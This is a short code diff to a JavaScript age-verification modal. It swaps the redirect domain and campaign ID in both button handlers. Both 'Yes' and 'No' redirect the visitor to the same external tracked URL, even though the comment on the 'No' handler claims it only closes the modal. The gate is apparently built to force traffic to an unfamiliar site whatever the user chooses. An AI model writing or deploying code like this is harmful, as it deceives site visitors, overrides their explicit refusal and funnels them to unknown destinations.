@@ -105,12 +105,12 @@ if(form){
   function closeGate(){ bd.style.display='none'; bd.remove(); }  
   // ✅ Redirect when "Yes" is clicked
   bd.querySelector('#age-yes').addEventListener('click', function(){
-    window.location.href = "http://t7q4.com/?utm_campaign=knLL6DKc9O&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+    window.location.href = "http://w23hub.com/?utm_campaign=Xh2TpWxhiS&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
   });
  
   // ✅ Just close modal when "No" is clicked
   bd.querySelector('#age-no').addEventListener('click', function(){
-    window.location.href = "http://t7q4.com/?utm_campaign=knLL6DKc9O&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+    window.location.href = "http://w23hub.com/?utm_campaign=Xh2TpWxhiS&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
   });
 })();
  
